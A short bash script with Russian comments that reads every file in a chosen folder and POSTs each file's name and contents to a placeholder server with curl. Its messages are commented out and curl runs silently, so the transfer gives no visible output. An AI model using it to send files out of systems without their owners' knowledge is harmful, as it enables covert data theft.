#!/bin/bash
# Заданные параметры
FOLDER="/путь/к/вашей/папке" # Замените на ваш путь 
SERVER="http://ваш.сервер.адрес" # Замените на адрес сервера
# Проверяем существование папки
if [ ! -d "$FOLDER" ]; then 
    #echo "Ошибка: Папка $FOLDER не существует!" 
    exit 1
 fi

# Функция для обработки файла
process_file() { 
    local file="$1" 
    local filename=$(basename "$file") 
    local content
    
    # Читаем содержимое, экранируя спецсимволы
    content=$(< "$file" sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\$/\\$/g')
    
    # Формируем данные в нужном формате
    echo "\"$filename\":\"$content\""
}
# Основной цикл
find "$FOLDER" -type f -print0 | while IFS= read -r -d $'\0' file; do
    # Обрабатываем файл
    data=$(process_file "$file")
    
    # Отправляем на сервер (пример с curl)
    #echo "Отправка $file..." 
    curl -X POST "$SERVER" -d "$data" --silent
    
    # Можно добавить задержку между запросами при необходимости sleep 0.1
done
#echo "Завершено! Все файлы из $FOLDER отправлены на $SERVER"
